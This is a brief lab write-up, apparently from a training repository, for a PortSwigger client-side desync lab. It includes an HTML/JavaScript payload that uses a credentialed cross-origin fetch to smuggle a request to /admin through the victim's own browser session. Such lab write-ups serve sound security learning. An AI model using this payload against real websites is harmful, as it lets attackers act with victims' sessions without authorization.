# Lab 07 — Client-side desync

> **Expert** · [Official lab](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

**Entry point:** a CL.0 desync that works entirely **in the victim's
browser** — cross-origin `fetch()` with `credentials: 'include'`.

## Solution

1. Find an endpoint that ignores Content-Length (probe like the CL.0 lab —
   often the root `/`).
2. Host on the exploit server a page that first causes a desync, then
   smuggles a request using the victim's cookies:

```html
<script>
  fetch('https://YOUR-LAB-ID/', {
    method: 'POST', credentials: 'include',
    body: 'GET /admin HTTP/1.1\r\nFoo: x'});
  // then a second fetch whose response is the poisoned/adminful one
</script>
```

3. Deliver to victim — their own browser desynchronizes the connection and
   the smuggled request executes with their session — lab solved.

## Notes

No server front-end involvement needed: browsers pipeline fetches on one
connection, so a CL-ignoring endpoint is enough.
